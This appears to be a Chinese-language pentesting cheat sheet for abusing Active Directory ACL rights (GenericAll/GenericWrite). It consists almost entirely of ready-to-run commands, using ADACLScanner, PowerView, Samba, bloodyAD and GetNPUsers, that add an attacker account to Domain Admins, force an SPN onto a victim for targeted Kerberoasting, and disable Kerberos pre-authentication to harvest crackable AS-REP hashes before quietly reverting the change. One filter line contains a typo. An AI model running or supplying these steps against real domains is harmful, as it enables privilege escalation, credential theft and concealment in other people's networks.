	使用ADACLScanner检查用户的 ACL
	https://github.com/canix1/ADACLScanner
	>ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
	GenericAll on User : 可以在不知道当前密码的情况下重置用户密码
	GenericAll on Group：允许将自己（攻击者）添加到 Domain Admin 组
	在 Windows 上：net group "domain admins" hacker /add /domain
	在 Linux 上：
	使用 Samba 软件套件
	>net rpc group ADDMEM "GROUP NAME" UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP]
	使用bloodyAD
	>bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME'
  #### GenericAll/GenericWrite：我们可以在目标帐户上设置一个SPN，请求一个 TGS，然后获取它的哈希并对其进行 kerberoast
	检查帐户权限
	>Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
	检查当前用户是否已经设置了 SPN
	PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname
	强制在账户上设置 SPN：Targeted Kerberoasting
	PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
	PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}
	获取票据
	PowerView2 > $User = Get-DomainUser username 
	PowerView2 > $User | Get-DomainSPNTicket | fl
	PowerView2 > $User | Select serviceprincipalname
	移除SPN
	PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
  #### GenericAll/GenericWrite：我们可以将受害者的userAccountControl更改为不需要 Kerberos 预身份验证，获取用户的可破解 AS-REP，然后将设置更改回来。
	Windows 上
	修改userAccountControl
	PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
	PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
	获取票据
	PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
	ASREPRoast > Get-ASREPHash -Domain domain.local -UserName username
	改回修改userAccountControl
	PowerView2 > Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose
	PowerView2 > Get-DomainUser username | ConvertFrom-UACValue
	Linux 上
	修改userAccountControl
	>bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user
	获取票据
	>GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
	改回修改userAccountControl
	>bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user false